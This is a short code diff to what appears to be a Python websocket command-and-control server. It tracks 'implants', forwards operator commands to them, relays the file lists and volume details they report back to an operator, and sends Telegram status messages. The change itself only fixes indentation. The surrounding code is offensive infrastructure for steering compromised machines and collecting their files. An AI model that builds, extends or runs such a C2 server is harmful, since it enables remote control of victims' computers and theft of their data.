@@ -66,7 +66,7 @@ async def websocket_handler(request):
                     if data['type'] == 'command' and target_id in IMPLANTS:
                         await IMPLANTS[target_id]["ws"].send_json(data['payload'])
                     elif data['type'] == 'get_details' and target_id in IMPLANTS:
-                                          details = {"files": IMPLANTS[target_id].get("files"), "volume": IMPLANTS[target_id].get("volume")}
+                        details = {"files": IMPLANTS[target_id].get("files"), "volume": IMPLANTS[target_id].get("volume")}
                         await OPERATOR.send_json({'type': 'bot_details', 'bot_id': target_id, 'data': details})
                 elif client_type == 'implant':
                     if data.get('type') == 'file_list_update':
@@ -123,3 +123,4 @@ if __name__ == "__main__":
         print("\nСервер остановлен.")
     finally:
         send_telegram_message("🛑 Сервер остановлен.")
+
